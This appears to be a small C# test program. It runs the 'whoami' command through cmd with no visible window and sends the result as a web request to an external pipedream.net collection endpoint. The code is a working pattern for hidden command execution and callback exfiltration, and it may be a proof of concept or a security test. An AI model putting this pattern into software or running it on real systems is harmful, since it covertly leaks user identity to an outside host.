using System;
using System.Net;
using System.Net.Http;
// https://qawithexperts.com/article/c-sharp/run-cmd-commands-using-c/520
// https://stackoverflow.com/a/27326758/9329272

namespace Test
{
    class Program
    {
        static void Main(string[] args)
        {
			string command = "whoami";
			System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            // Do not create the black window.
            procStartInfo.CreateNoWindow = true;
            // Now we create a process, assign its ProcessStartInfo and start it
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            // Get the output into a string
            string whoami = proc.StandardOutput.ReadToEnd();
            Console.WriteLine("Making API Call...");
            using (var client = new HttpClient(new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate }))
            {
                client.BaseAddress = new Uri("https://eoqqzdfuzmgq7gg.m.pipedream.net/");
                HttpResponseMessage response = client.GetAsync(whoami).Result;
                response.EnsureSuccessStatusCode();
                string result = response.Content.ReadAsStringAsync().Result;
                Console.WriteLine("Result: " + result);
            }
            Console.ReadLine();
        }
    }
}